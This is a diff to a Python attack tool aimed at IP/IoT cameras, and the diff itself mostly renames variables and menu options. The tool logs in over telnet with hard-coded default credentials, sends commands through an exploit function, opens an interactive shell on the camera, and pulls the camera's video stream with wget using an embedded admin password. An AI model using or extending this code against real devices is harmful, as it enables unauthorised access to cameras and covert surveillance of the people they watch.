@@ -1,6 +1,5 @@
 import os,sys,time,socket,subprocess,telnetlib
-LISTEN_PORT = 5000
-HOST = "0.0.0.0"  #Victim IOT Camera
+target = "0.0.0.0"  #IP Camera
 webpage = "monitor4.asp"
 user = "admin"
 password = "ipcam_rt"
@@ -30,10 +29,11 @@ main = """Please Select an option:
 [7]
 [8]
 [9] Play Spy Music
-
-[d] Debug
-[x] Demo
 [0] Exit
+
+Other:
+[i] Show Info
+[x] Demo
 """
 
 def loading(text):
@@ -96,7 +96,7 @@ def kill():
 
 def grab():
     print "grabbing stream"
-    os.system("wget 'http://" + HOST + "/vjpeg.v?user=admin&pwd=Admin1234!' -O stream")
+    os.system("wget 'http://" + target + "/vjpeg.v?user=admin&pwd=Admin1234!' -O stream")
     prompt()
 
 def shell():
@@ -104,6 +104,8 @@ def shell():
     connect()
     tn.interact()
 
+
+#Change hard-coded port into variable? Need to test with cam
 def demo():
     self_ip = get_ip()
     FNULL = open(os.devnull, 'w')
@@ -155,19 +157,18 @@ def get_ip():
         s.close()
     return IP
     
-def debug():
+def info():
     print "Printing Debug Information:" 
     print "Local IP Address: " + get_ip()
-    print "Value of HOST: " + HOST
-    print "Value of user: " + user
-    print "Value of password " + password
-    print "THIS IS A TEST " + get_ip() 
+    print "Target IP Address: " + target
+    print "Username: " + user
+    print "Password: " + password
 
     prompt()
 
 def connect():
     global tn 
-    tn = telnetlib.Telnet(HOST)
+    tn = telnetlib.Telnet(target)
     tn.read_until("login: ")
     tn.write(user + "\n")
     tn.read_until("Password: ")
@@ -177,10 +178,15 @@ def exploit():
     tn.write(command + "\n")
     tn.write("exit" + "\n")
 
-
+def music():
+    print "DUN DUN DUN DUN DUN DUNUN DUN DUN DUN DUN"
+    print "DUN DUN DUN"
+    prompt()
 
     
-
+#========================================
+#Function to Number Mappings            #
+#========================================
 
 menu_actions = {
     'main_menu': main_menu,
@@ -190,9 +196,10 @@ menu_actions = {
     '4': shell,
     '5': recon,
     'x': demo,
-    'd': debug,
+    'i': info,
     '0': exit,
     'q': exit,
+    '9': music,
 }
 
 
